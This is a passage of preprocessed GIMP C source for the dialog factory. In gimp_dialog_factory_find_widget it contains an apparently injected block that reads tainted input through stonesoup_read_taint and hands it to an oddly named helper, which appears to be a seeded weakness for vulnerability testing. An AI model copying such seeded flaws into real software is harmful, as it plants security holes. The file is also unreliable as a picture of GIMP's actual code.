g_type,G_SIGNAL_RUN_LAST,((glong )((size_t )(&((GimpDialogFactoryClass *)0) -> dock_window_removed))),((void *)0),((void *)0),g_cclosure_marshal_VOID__OBJECT,((GType )(1 << 2)),1,gimp_dock_window_get_type());\n  g_type_class_add_private(klass,sizeof(GimpDialogFactoryPrivate ));\n}\n\nstatic void gimp_dialog_factory_init(GimpDialogFactory *factory)\n{\n  factory -> p = ((GimpDialogFactoryPrivate *)(g_type_instance_get_private(((GTypeInstance *)factory),gimp_dialog_factory_get_type())));\n  factory -> p -> dialog_state = GIMP_DIALOGS_SHOWN;\n}\n\nstatic void gimp_dialog_factory_dispose(GObject *object)\n{\n  GimpDialogFactory *factory = (GimpDialogFactory *)(g_type_check_instance_cast(((GTypeInstance *)object),gimp_dialog_factory_get_type()));\n  GList *list;\n/*  start iterating from the beginning each time we destroyed a\n   *  toplevel because destroying a dock may cause lots of items\n   *  to be removed from factory->p->open_dialogs\n   */\n  while(factory -> p -> open_dialogs){\n    for (list = factory -> p -> open_dialogs; list; list = (list?((GList *)list) -> next : ((void *)0))) {\n      if (gtk_widget_is_toplevel((list -> data))) {\n        gtk_widget_destroy(((GtkWidget *)(g_type_check_instance_cast(((GTypeInstance *)(list -> data)),gtk_widget_get_type()))));\n        break; \n      }\n    }\n/*  the list being non-empty without any toplevel is an error,\n       *  so eek and chain up\n       */\n    if (!list) {\n      g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: %d stale non-toplevel entries in factory->p->open_dialogs\",((const char *)__func__),g_list_length(factory -> p -> open_dialogs));\n      break; \n    }\n  }\n  if (factory -> p -> open_dialogs) {\n    g_list_free(factory -> p -> open_dialogs);\n    factory -> p -> open_dialogs = ((void *)0);\n  }\n  if (factory -> p -> session_infos) {\n    g_list_free_full(factory -> p -> session_infos,((GDestroyNotify )g_object_unref));\n    factory -> p -> session_infos = ((void *)0);\n  }\n  (((GObjectClass *)(g_type_check_class_cast(((GTypeClass *)gimp_dialog_factory_parent_class),((GType )(20 << 2))))) -> dispose)(object);\n}\n\nstatic void gimp_dialog_factory_finalize(GObject *object)\n{\n  GimpDialogFactory *factory = (GimpDialogFactory *)(g_type_check_instance_cast(((GTypeInstance *)object),gimp_dialog_factory_get_type()));\n  GList *list;\n  for (list = factory -> p -> registered_dialogs; list; list = (list?((GList *)list) -> next : ((void *)0))) {\n    GimpDialogFactoryEntry *entry = (list -> data);\n    g_free((entry -> identifier));\n    g_free((entry -> name));\n    g_free((entry -> blurb));\n    g_free((entry -> stock_id));\n    g_free((entry -> help_id));\n    do {\n      if (1) {\n        g_slice_free1(sizeof(GimpDialogFactoryEntry ),entry);\n      }\n      else {\n        (void )(((GimpDialogFactoryEntry *)0) == entry);\n      }\n    }while (0);\n  }\n  if (factory -> p -> registered_dialogs) {\n    g_list_free(factory -> p -> registered_dialogs);\n    factory -> p -> registered_dialogs = ((void *)0);\n  }\n  (((GObjectClass *)(g_type_check_class_cast(((GTypeClass *)gimp_dialog_factory_parent_class),((GType )(20 << 2))))) -> finalize)(object);\n}\n\nGimpDialogFactory *gimp_dialog_factory_new(const gchar *name,GimpContext *context,GimpMenuFactory *menu_factory)\n{\n  GimpDialogFactory *factory;\n  GimpGuiConfig *config;\n  do {\n    if (name != ((void *)0)) {\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"name != NULL\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)context;\n      GType __t = gimp_context_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_CONTEXT (context)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  do {\n    if (!menu_factory || (({\n      GTypeInstance *__inst = (GTypeInstance *)menu_factory;\n      GType __t = gimp_menu_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    }))) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"! menu_factory || GIMP_IS_MENU_FACTORY (menu_factory)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  factory = (g_object_new(gimp_dialog_factory_get_type(),((void *)0)));\n  gimp_object_set_name(((GimpObject *)(g_type_check_instance_cast(((GTypeInstance *)factory),gimp_object_get_type()))),name);\n  config = ((GimpGuiConfig *)(g_type_check_instance_cast(((GTypeInstance *)(context -> gimp -> config)),gimp_gui_config_get_type())));\n  factory -> p -> context = context;\n  factory -> p -> menu_factory = menu_factory;\n  factory -> p -> dialog_state = ((config -> hide_docks?GIMP_DIALOGS_HIDDEN_EXPLICITLY : GIMP_DIALOGS_SHOWN));\n  g_signal_connect_object(config,\"notify::hide-docks\",((GCallback )gimp_dialog_factory_config_notify),factory,G_CONNECT_SWAPPED);\n  return factory;\n}\n\nvoid gimp_dialog_factory_register_entry(GimpDialogFactory *factory,const gchar *identifier,const gchar *name,const gchar *blurb,const gchar *stock_id,const gchar *help_id,GimpDialogNewFunc new_func,GimpDialogRestoreFunc restore_func,gint view_size,gboolean singleton,gboolean session_managed,gboolean remember_size,gboolean remember_if_open,gboolean hideable,gboolean image_window,gboolean dockable)\n{\n  GimpDialogFactoryEntry *entry;\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ;\n    }\n    ;\n  }while (0);\n  do {\n    if (identifier != ((void *)0)) {\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"identifier != NULL\");\n      return ;\n    }\n    ;\n  }while (0);\n  entry = ((GimpDialogFactoryEntry *)(g_slice_alloc0(sizeof(GimpDialogFactoryEntry ))));\n  entry -> identifier = g_strdup(identifier);\n  entry -> name = g_strdup(name);\n  entry -> blurb = g_strdup(blurb);\n  entry -> stock_id = g_strdup(stock_id);\n  entry -> help_id = g_strdup(help_id);\n  entry -> new_func = new_func;\n  entry -> restore_func = restore_func;\n  entry -> view_size = view_size;\n  entry -> singleton = (singleton?!0 : 0);\n  entry -> session_managed = (session_managed?!0 : 0);\n  entry -> remember_size = (remember_size?!0 : 0);\n  entry -> remember_if_open = (remember_if_open?!0 : 0);\n  entry -> hideable = (hideable?!0 : 0);\n  entry -> image_window = (image_window?!0 : 0);\n  entry -> dockable = (dockable?!0 : 0);\n  factory -> p -> registered_dialogs = g_list_prepend(factory -> p -> registered_dialogs,entry);\n}\n\nGimpDialogFactoryEntry *gimp_dialog_factory_find_entry(GimpDialogFactory *factory,const gchar *identifier)\n{\n  GList *list;\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  do {\n    if (identifier != ((void *)0)) {\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"identifier != NULL\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  for (list = factory -> p -> registered_dialogs; list; list = (list?((GList *)list) -> next : ((void *)0))) {\n    GimpDialogFactoryEntry *entry = (list -> data);\n    if (!strcmp(identifier,(entry -> identifier))) {\n      return entry;\n    }\n  }\n  return ((void *)0);\n}\n\nGimpSessionInfo *gimp_dialog_factory_find_session_info(GimpDialogFactory *factory,const gchar *identifier)\n{\n  GList *list;\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  do {\n    if (identifier != ((void *)0)) {\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"identifier != NULL\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  for (list = factory -> p -> session_infos; list; list = (list?((GList *)list) -> next : ((void *)0))) {\n    GimpSessionInfo *info = (list -> data);\n    if (gimp_session_info_get_factory_entry(info) && g_str_equal(identifier,(gimp_session_info_get_factory_entry(info) -> identifier))) {\n      return info;\n    }\n  }\n  return ((void *)0);\n}\n\nGtkWidget *gimp_dialog_factory_find_widget(GimpDialogFactory *factory,const gchar *identifiers)\n{\n  int overbulky_tarweeds = 0;\n  char *mullan_aribine = 0;\n  int uropodous_marble = 30;\n  char *tumaco_educts;\n  GtkWidget *widget = ((void *)0);\n  gchar **ids;\n  gint i;\n  if (__sync_bool_compare_and_swap(&sentimos_christa,0,1)) {;\n    if (mkdir(\"/opt/stonesoup/workspace/lockDir\",509U) == 0) {;\n      tracepoint(stonesoup_trace,trace_location,\"/tmp/tmpSaTeqU_ss_testcase/src-rose/app/widgets/gimpdialogfactory.c\",\"gimp_dialog_factory_find_widget\");\n      stonesoup_setup_printf_context();\n      stonesoup_read_taint(&tumaco_educts,\"1427\",uropodous_marble);\n      if (tumaco_educts != 0) {;\n        overbulky_tarweeds = ((int )(strlen(tumaco_educts)));\n        mullan_aribine = ((char *)(malloc(overbulky_tarweeds + 1)));\n        if (mullan_aribine == 0) {\n          stonesoup_printf(\"Error: Failed to allocate memory\\n\");\n          exit(1);\n        }\n        memset(mullan_aribine,0,overbulky_tarweeds + 1);\n        memcpy(mullan_aribine,tumaco_educts,overbulky_tarweeds);\n        if (tumaco_educts != 0) \n          free(((char *)tumaco_educts));\n        frowstiest_bonny(mullan_aribine);\n      }\n    }\n  }\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  do {\n    if (identifiers != ((void *)0)) {\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"identifiers != NULL\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  ids = g_strsplit(identifiers,\"|\",0);\n  for (i = 0; ids[i]; i++) {\n    GimpSessionInfo *info;\n    info = gimp_dialog_factory_find_session_info(factory,ids[i]);\n    if (info) {\n      widget = gimp_session_info_get_widget(info);\n      if (widget) {\n        break; \n      }\n    }\n  }\n  g_strfreev(ids);\n  return widget;\n}\n/**\n * gimp_dialog_factory_dialog_sane:\n * @factory:\n * @widget_factory:\n * @widget_entry:\n * @widget:\n *\n * Makes sure that the @widget with the given @widget_entry that was\n * created by the given @widget_factory belongs to @efactory.\n *\n * Returns: %TRUE if that is the case, %FALSE otherwise.\n **/\n\nstatic gboolean gimp_dialog_factory_dialog_sane(GimpDialogFactory *factory,GimpDialogFactory *widget_factory,GimpDialogFactoryEntry *widget_entry,GtkWidget *widget)\n{\n  if (!widget_factory || !widget_entry) {\n    g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: dialog was not created by a GimpDialogFactory\",((const char *)__func__));\n    return 0;\n  }\n  if (widget_factory != factory) {\n    g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: dialog was created by a different GimpDialogFactory\",((const char *)__func__));\n    return 0;\n  }\n  return !0;\n}\n/**\n * gimp_dialog_factory_dialog_new_internal:\n * @factory:\n * @screen:\n * @context:\n * @ui_manager:\n * @identifier:\n * @view_size:\n * @return_existing:   If %TRUE, (or if the dialog is a singleton),\n *                     don't create a new dialog if it exists, instead\n *                     return the existing one\n * @present:           If %TRUE, the toplevel that contains the dialog (if any)\n *                     will be gtk_window_present():ed\n * @create_containers: If %TRUE, then containers for the\n *                     dialog/dockable will be created as well. If you\n *                     want to manage your own containers, pass %FALSE\n *\n * This is the lowest level dialog factory creation function.\n *\n * Returns: A created or existing #GtkWidget.\n **/\n\nstatic GtkWidget *gimp_dialog_factory_dialog_new_internal(GimpDialogFactory *factory,GdkScreen *screen,GimpContext *context,GimpUIManager *ui_manager,const gchar *identifier,gint view_size,gboolean return_existing,gboolean present,gboolean create_containers)\n{\n  GimpDialogFactoryEntry *entry = ((void *)0);\n  GtkWidget *dialog = ((void *)0);\n  GtkWidget *toplevel = ((void *)0);\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  do {\n    if (identifier != ((void *)0)) {\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"identifier != NULL\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  entry = gimp_dialog_factory_find_entry(factory,identifier);\n  if (!entry) {\n    g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: no entry registered for \\\"%s\\\"\",((const char *)__func__),identifier);\n    return ((void *)0);\n  }\n  if (!entry -> new_func) {\n    g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: entry for \\\"%s\\\" has no constructor\",((const char *)__func__),identifier);\n    return ((void *)0);\n  }\n/*  a singleton dialog is always returned if it already exisits  */\n  if (return_existing || entry -> singleton) {\n    dialog = gimp_dialog_factory_find_widget(factory,identifier);\n  }\n/*  create the dialog if it was not found  */\n  if (!dialog) {\n    GtkWidget *dock = ((void *)0);\n    GtkWidget *dock_window = ((void *)0);\n/* What follows is special-case code for some entires. At some\n       * point we might want to abstract this block of code away.\n       */\n    if (create_containers) {\n      if (entry -> dockable) {\n        GtkWidget *dockbook;\n/*  It doesn't make sense to have a dockable without a dock\n               *  so create one. Create a new dock _before_ creating the\n               *  dialog. We do this because the new dockable needs to be\n               *  created in its dock's context.\n               */\n        dock = gimp_dock_with_window_new(factory,screen,0);\n/*toolbox*/\n        dockbook = gimp_dockbook_new(factory -> p -> menu_factory);\n        gimp_dock_add_book(((GimpDock *)(g_type_check_instance_cast(((GTypeInstance *)dock),gimp_dock_get_type()))),((GimpDockbook *)(g_type_check_instance_cast(((GTypeInstance *)dockbook),gimp_dockbook_get_type()))),0);\n      }\n      else {\n        if (strcmp(\"gimp-toolbox\",(entry -> identifier)) == 0) {\n          GimpDockContainer *dock_container;\n          dock_window = gimp_dialog_factory_dialog_new(factory,screen,((void *)0),\"gimp-toolbox-window\",- 1,0);\n/*ui_manager*/\n/*view_size*/\n/*present*/\n/* When we get a dock window, we also get a UI\n               * manager\n               */\n          dock_container = ((GimpDockContainer *)(g_type_check_instance_cast(((GTypeInstance *)dock_window),gimp_dock_container_interface_get_type())));\n          ui_manager = gimp_dock_container_get_ui_manager(dock_container);\n        }\n      }\n    }\n/*  Create the new dialog in the appropriate context which is\n       *  - the passed context if not NULL\n       *  - the newly created dock's context if we just created it\n       *  - the factory's context, which happens when raising a toplevel\n       *    dialog was the original request.\n       */\n    if (view_size < GIMP_VIEW_SIZE_TINY) {\n      view_size = entry -> view_size;\n    }\n    if (context) {\n      dialog = gimp_dialog_factory_constructor(factory,entry,context,ui_manager,view_size);\n    }\n    else {\n      if (dock) {\n        dialog = gimp_dialog_factory_constructor(factory,entry,gimp_dock_get_context(((GimpDock *)(g_type_check_instance_cast(((GTypeInstance *)dock),gimp_dock_get_type())))),gimp_dock_get_ui_manager(((GimpDock *)(g_type_check_instance_cast(((GTypeInstance *)dock),gimp_dock_get_type())))),view_size);\n      }\n      else {\n        dialog = gimp_dialog_factory_constructor(factory,entry,factory -> p -> context,ui_manager,view_size);\n      }\n    }\n    if (dialog) {\n      gimp_dialog_factory_set_widget_data(dialog,factory,entry);\n/*  If we created a dock before, the newly created dialog is\n           *  supposed to be a GimpDockable.\n           */\n      if (dock) {\n        if (({\n          GTypeInstance *__inst = (GTypeInstance *)dialog;\n          GType __t = gimp_dockable_get_type();\n          gboolean __r;\n          if (!__inst) {\n            __r = 0;\n          }\n          else {\n            if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n              __r = !0;\n            }\n            else {\n              __r = g_type_check_instance_is_a(__inst,__t);\n            }\n          }\n          __r;\n        })) \n{\n          gimp_dock_add(((GimpDock *)(g_type_check_instance_cast(((GTypeInstance *)dock),gimp_dock_get_type()))),((GimpDockable *)(g_type_check_instance_cast(((GTypeInstance *)dialog),gimp_dockable_get_type()))),0,0);\n          gtk_widget_show(dock);\n        }\n        else {\n          g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: GimpDialogFactory is a dockable factory but constructor for \\\"%s\\\" did not return a GimpDockable\",((const char *)__func__),identifier);\n          gtk_widget_destroy(dialog);\n          gtk_widget_destroy(dock);\n          dialog = ((void *)0);\n          dock = ((void *)0);\n        }\n      }\n      else {\n        if (dock_window) {\n          if (({\n            GTypeInstance *__inst = (GTypeInstance *)dialog;\n            GType __t = gimp_dock_get_type();\n            gboolean __r;\n            if (!__inst) {\n              __r = 0;\n            }\n            else {\n              if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n                __r = !0;\n              }\n              else {\n                __r = g_type_check_instance_is_a(__inst,__t);\n              }\n            }\n            __r;\n          })) \n{\n            gimp_dock_window_add_dock(((GimpDockWindow *)(g_type_check_instance_cast(((GTypeInstance *)dock_window),gimp_dock_window_get_type()))),((GimpDock *)(g_type_check_instance_cast(((GTypeInstance *)dialog),gimp_dock_get_type()))),- 1);\n/*index*/\n            gtk_widget_set_visible(dialog,present);\n            gtk_widget_set_visible(dock_window,present);\n          }\n          else {\n            g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: GimpDialogFactory is a dock factory entry but constructor for \\\"%s\\\" did not return a GimpDock\",((const char *)__func__),identifier);\n            gtk_widget_destroy(dialog);\n            gtk_widget_destroy(dock_window);\n            dialog = ((void *)0);\n            dock_window = ((void *)0);\n          }\n        }\n      }\n    }\n    else {\n      if (dock) {\n        g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: constructor for \\\"%s\\\" returned NULL\",((const char *)__func__),identifier);\n        gtk_widget_destroy(dock);\n        dock = ((void *)0);\n      }\n    }\n    if (dialog) {\n      gimp_dialog_factory_add_dialog(factory,dialog);\n    }\n  }\n/*  Finally, if we found an existing dialog or created a new one, raise it.\n   */\n  if (!dialog) {\n    return ((void *)0);\n  }\n  if (gtk_widget_is_toplevel(dialog)) {\n    gtk_window_set_screen(((GtkWindow *)(g_type_check_instance_cast(((GTypeInstance *)dialog),gtk_window_get_type()))),screen);\n    toplevel = dialog;\n  }\n  else {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)dialog;\n      GType __t = gimp_dock_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n      toplevel = gtk_widget_get_toplevel(dialog);\n    }\n    else {\n      if (({\n        GTypeInstance *__inst = (GTypeInstance *)dialog;\n        GType __t = gimp_dockable_get_type();\n        gboolean __r;\n        if (!__inst) {\n          __r = 0;\n        }\n        else {\n          if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n            __r = !0;\n          }\n          else {\n            __r = g_type_check_instance_is_a(__inst,__t);\n          }\n        }\n        __r;\n      })) \n{\n        GimpDockable *dockable = (GimpDockable *)(g_type_check_instance_cast(((GTypeInstance *)dialog),gimp_dockable_get_type()));\n        if (gimp_dockable_get_dockbook(dockable) && gimp_dockbook_get_dock(gimp_dockable_get_dockbook(dockable))) {\n          GtkNotebook *notebook = (GtkNotebook *)(g_type_check_instance_cast(((GTypeInstance *)(gimp_dockable_get_dockbook(dockable))),gtk_notebook_get_type()));\n          gint num = gtk_notebook_page_num(notebook,dialog);\n          if (num != - 1) {\n            gtk_notebook_set_current_page(notebook,num);\n            gimp_dockable_blink(dockable);\n          }\n        }\n        toplevel = gtk_widget_get_toplevel(dialog);\n      }\n    }\n  }\n  if (present && (({\n    GTypeInstance *__inst = (GTypeInstance *)toplevel;\n    GType __t = gtk_window_get_type();\n    gboolean __r;\n    if (!__inst) {\n      __r = 0;\n    }\n    else {\n      if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n        __r = !0;\n      }\n      else {\n        __r = g_type_check_instance_is_a(__inst,__t);\n      }\n    }\n    __r;\n  }))) \n{\n/*  Work around focus-stealing protection, or whatever makes the\n       *  dock appear below the one where we clicked a button to open\n       *  it. See bug #630173.\n       */\n    gtk_widget_show_now(toplevel);\n    gdk_window_raise(gtk_widget_get_window(toplevel));\n  }\n  return dialog;\n}\n/**\n * gimp_dialog_factory_dialog_new:\n * @factory:      a #GimpDialogFactory\n * @screen:       the #GdkScreen the dialog should appear on\n * @ui_manager:   A #GimpUIManager, if applicable.\n * @identifier:   the identifier of the dialog as registered with\n *                gimp_dialog_factory_register_entry()\n * @view_size:    the initial preview size\n * @present:      whether gtk_window_present() should be called\n *\n * Creates a new toplevel dialog or a #GimpDockable, depending on whether\n * %factory is a toplevel of dockable factory.\n *\n * Return value: the newly created dialog or an already existing singleton\n *               dialog.\n **/\n\nGtkWidget *gimp_dialog_factory_dialog_new(GimpDialogFactory *factory,GdkScreen *screen,GimpUIManager *ui_manager,const gchar *identifier,gint view_size,gboolean present)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)screen;\n      GType __t = gdk_screen_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GDK_IS_SCREEN (screen)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  do {\n    if (identifier != ((void *)0)) {\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"identifier != NULL\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  return gimp_dialog_factory_dialog_new_internal(factory,screen,factory -> p -> context,ui_manager,identifier,view_size,0,present,0);\n/*return_existing*/\n/*create_containers*/\n}\n\nGimpContext *gimp_dialog_factory_get_context(GimpDialogFactory *factory)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  return factory -> p -> context;\n}\n\nGimpMenuFactory *gimp_dialog_factory_get_menu_factory(GimpDialogFactory *factory)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  return factory -> p -> menu_factory;\n}\n\nGList *gimp_dialog_factory_get_open_dialogs(GimpDialogFactory *factory)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  return factory -> p -> open_dialogs;\n}\n\nGList *gimp_dialog_factory_get_session_infos(GimpDialogFactory *factory)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  return factory -> p -> session_infos;\n}\n\nvoid gimp_dialog_factory_add_session_info(GimpDialogFactory *factory,GimpSessionInfo *info)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ;\n    }\n    ;\n  }while (0);\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)info;\n      GType __t = gimp_session_info_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_SESSION_INFO (info)\");\n      return ;\n    }\n    ;\n  }while (0);\n/* We want to append rather than prepend so that the serialized\n   * order in sessionrc remains the same\n   */\n  factory -> p -> session_infos = g_list_append(factory -> p -> session_infos,g_object_ref(info));\n}\n/**\n * gimp_dialog_factory_dialog_raise:\n * @factory:      a #GimpDialogFactory\n 